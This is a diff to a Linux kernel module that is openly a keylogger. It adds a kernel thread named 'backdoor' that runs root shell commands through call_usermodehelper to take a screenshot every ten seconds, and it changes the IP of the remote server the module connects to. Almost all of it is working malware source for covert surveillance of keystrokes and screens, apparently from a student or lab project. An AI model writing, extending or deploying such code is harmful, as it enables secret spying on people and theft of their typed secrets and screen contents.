@@ -6,13 +6,66 @@
 #include <linux/net.h>
 #include <linux/in.h>
 #include <linux/inet.h>
+#include <linux/kthread.h>
+#include <linux/delay.h>
 
-#define SERVER_IP "192.168.0.18"
+#define SERVER_IP "172.20.35.41"
 #define SERVER_PORT 8888
 
 MODULE_LICENSE("GPL");
 
 struct socket *sock;
+int image_counter = 0;
+
+int execute_shell_command(char *cmd)
+{
+    char *argv[] = {"/bin/bash", "-c", (char *)cmd, NULL};
+    char *envp[] = {
+        "HOME=/",
+        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
+        NULL};
+
+    int ret;
+
+    printk(KERN_INFO "command: %s", cmd);
+
+    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+    if (ret < 0)
+    {
+        printk(KERN_ERR "Usermodehelper error: %d\n", ret);
+        return ret;
+    }
+
+    return 0;
+}
+
+static int runSnapshotThread(void *data)
+{
+    printk(KERN_INFO "Snapshot thread started\n");
+    while (true)
+    {
+        char *cmd = kmalloc(100, GFP_KERNEL);
+
+        // Take a snapshot of the screen
+        sprintf(cmd, "sudo import -window root /media/sf_Shared/linux_backdoor/tmp/snapshot%d.png", image_counter);
+        image_counter++;
+        execute_shell_command(cmd);
+        printk(KERN_INFO "Snapshot taken\n");
+
+        // Wait 10 seconds
+        set_current_state(TASK_INTERRUPTIBLE);
+        schedule_timeout(msecs_to_jiffies(10 * 1000));
+
+        if (kthread_should_stop())
+        {
+            printk(KERN_INFO "Snapshot thread stopped\n");
+            break;
+        }
+
+        kfree(cmd);
+    }
+    return 0;
+}
 
 static int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param)
 {
@@ -95,6 +148,9 @@ static int __init keylogger_init(void)
     // Register the keylogger
     register_keyboard_notifier(&keylogger_nb);
 
+    // create a thread to execute the shell command
+    kthread_run(runSnapshotThread, NULL, "backdoor");
+
     printk(KERN_INFO "Keylogger module initialized\n");
 
     return 0;
@@ -114,6 +170,10 @@ static void __exit keylogger_exit(void)
 
     printk(KERN_INFO "Keylogger module exited\n");
 }
+
+MODULE_AUTHOR("Heitor Tanoue");
+MODULE_AUTHOR("Beatriz Cardoso");
+MODULE_AUTHOR("Beatriz Aimee");
 
 module_init(keylogger_init);
 module_exit(keylogger_exit);
